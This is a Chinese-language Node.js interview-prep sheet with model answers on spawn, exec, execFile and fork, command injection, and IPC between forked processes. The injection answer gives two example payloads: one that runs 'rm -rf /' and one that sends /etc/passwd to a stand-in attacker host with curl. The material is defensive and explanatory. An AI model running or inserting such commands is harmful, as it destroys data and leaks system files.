# 大厂高频面试题精讲 (01-child-process-basics)

---

### Q1: `spawn`、`exec`、`execFile` 与 `fork` 的核心差异是什么？在实际开发中如何技术选型？

#### 🎯 面试官考点
- Node.js 进程管理四大原语的底层差异、缓冲区控制与安全边界。

#### 💡 满分回答模板
| API | 是否启动 Shell | 数据返回形式 | 内存缓冲区限制 | 专属 IPC 管道 | 适用典型场景 |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **`spawn`** | 默认否 | **流（Stream）** | **无限制**（按需流式消费） | 否 | 长时间运行、大量日志输出、大文件压缩转码（如 ffmpeg） |
| **`exec`** | **是**（`/bin/sh`） | 回调函数（Buffer/String） | 默认 **1MB**（超限直接抛错） | 否 | 简单 Shell 管道命令（如 `ls \| grep`），存在注入隐患 |
| **`execFile`** | **否**（直接调用二进制） | 回调函数（Buffer/String） | 默认 **1MB** | 否 | 运行固定可执行文件（如 `git --version`），免疫 Shell 注入 |
| **`fork`** | 否（仅运行 Node 脚本） | 流 + IPC 事件 | 无限制 | **原生支持 IPC (`process.send`)** | 衍生独立的 Node.js 工作子进程、多进程计算任务 |

### Q2: 为什么在生产环境中严禁直接将用户输入拼接到 `exec()` 中？如何彻底杜绝命令注入（Command Injection）漏洞？

#### 🎯 面试官考点
- 应用安全防护（DevSecOps）与 Shell 解析器元字符利用原理。

#### 💡 满分回答模板
1. **漏洞原理（Shell 元字符逃逸）**：
   - `exec(cmd)` 会在底层直接拉起一个系统的 Shell（如 `bash` 或 `sh`），然后将整段字符串作为命令执行。
   - 示例危险代码：`exec(`ping -c 1 ${userInput}`)`。
   - 如果恶意攻击者传入：`"127.0.0.1; rm -rf /"` 或 `"127.0.0.1 && curl evil.com/steal?data=$(cat /etc/passwd)"`。
   - Shell 会将分号 `;` 或 `&&` 解释为**多条命令分隔符**，从而在服务器上以 Node.js 进程权限肆无忌惮地执行攻击者的恶意脚本！
2. **彻底杜绝的解决方案**：
   - **全面使用 `execFile` 或 `spawn`**：这两个 API **完全跳过 Shell 解释器**，操作系统直接把参数作为不可分割的字符串数组（Argv）传递给底层可执行文件。即便参数里包含 `;`、`&&`、`|`，操作系统也只会将其当成普通的文件名或纯文本参数，根本无法被当成新命令执行。

### Q3: `fork()` 进程之间是如何进行 IPC 通信的？传递的 JavaScript 对象在两个进程间会共享内存吗？

#### 🎯 面试官考点
- 跨进程通信（IPC）底层机制（Unix Domain Socket / Windows Named Pipe）与序列化开销。

#### 💡 满分回答模板
1. **底层通道实现**：
   - 当调用 `fork()` 时，Node.js 会在主进程与子进程之间创建一条全双工的专属 IPC 通道：
     - 在 Linux / macOS 上，底层通过 **Unix Domain Socket** 实现；
     - 在 Windows 上，底层通过 **命名管道（Named Pipe）** 实现。
   - 这条通道的物理文件描述符被映射在 `process.channel` 上。
2. **对象绝不共享内存（深层序列化）**：
   - 进程之间内存是**完全物理隔离的**！各自拥有独立的 V8 堆栈和垃圾回收器。
   - 当调用 `child.send({ data: 123 })` 时，Node.js 内部会使用 V8 序列化算法将对象转换为二进制字节流或 JSON 字符串，通过 IPC 管道写入对端，子进程收到后再反序列化生成一个全新独立的对象副本。因此修改子进程中的对象属性，绝不会影响父进程。
